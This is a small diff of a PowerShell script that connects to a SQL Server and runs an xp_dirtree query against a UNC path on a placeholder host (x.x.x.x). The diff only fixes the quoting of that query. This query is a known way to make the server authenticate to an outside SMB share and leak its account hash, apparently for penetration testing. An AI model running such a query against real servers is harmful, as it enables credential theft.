@@ -1,7 +1,7 @@
 $ServerInstance = "sql.web.site "
 $Database = "master "
 $ConnectionTimeout = 30
-$Query = "EXEC master..xp_dirtree \"\\\\x.x.x.x\\\\fake\";"
+$Query = 'EXEC master..xp_dirtree \\x.x.x.x\\fake\";'
 $QueryTimeout = 120
 
 $conn=new-object System.Data.SqlClient.SQLConnection
